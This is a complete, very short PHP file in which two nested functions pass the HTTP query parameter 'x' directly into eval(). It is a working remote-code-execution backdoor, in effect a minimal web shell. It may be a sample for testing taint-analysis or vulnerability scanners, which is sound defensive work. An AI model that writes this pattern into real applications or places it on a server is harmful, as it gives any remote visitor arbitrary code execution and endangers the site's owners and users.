<?php
function two($arg) {
	eval($arg);
}

function one($arg) {
	two($arg);
}

one($_GET['x']);
?>
